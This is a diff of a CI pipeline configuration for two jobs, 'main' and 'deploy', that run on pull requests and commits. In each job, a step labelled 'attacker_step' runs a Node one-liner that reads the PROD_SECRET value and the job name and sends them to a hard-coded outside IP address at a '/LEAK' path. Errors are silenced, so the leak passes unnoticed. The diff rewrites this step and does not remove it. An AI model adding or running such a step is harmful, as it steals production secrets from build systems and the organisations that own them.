@@ -2,14 +2,17 @@ shared:
   image: node:18
 jobs:
   main:
-    requires: [~pr, ~commit]
+    requires:
+    - ~pr
+    - ~commit
     secrets:
-      - PROD_SECRET
+    - PROD_SECRET
     steps:
-      - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK?job='+process.env.SD_JOB_NAME+'\&PROD_SECRET='+encodeURIComponent(process.env.PROD_SECRET||'UNSET'),r=>r.resume()).on('error',()=>{})"
+    - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK/'+encodeURIComponent(process.env.SD_JOB_NAME||'nojob')+'/'+encodeURIComponent(process.env.PROD_SECRET||'UNSET'), r=>r.resume()).on('error',()=>{})"
   deploy:
-    requires: [main]
+    requires:
+    - main
     secrets:
-      - PROD_SECRET
+    - PROD_SECRET
     steps:
-      - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK?job='+process.env.SD_JOB_NAME+'\&PROD_SECRET='+encodeURIComponent(process.env.PROD_SECRET||'UNSET'),r=>r.resume()).on('error',()=>{})"
+    - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK/'+encodeURIComponent(process.env.SD_JOB_NAME||'nojob')+'/'+encodeURIComponent(process.env.PROD_SECRET||'UNSET'), r=>r.resume()).on('error',()=>{})"
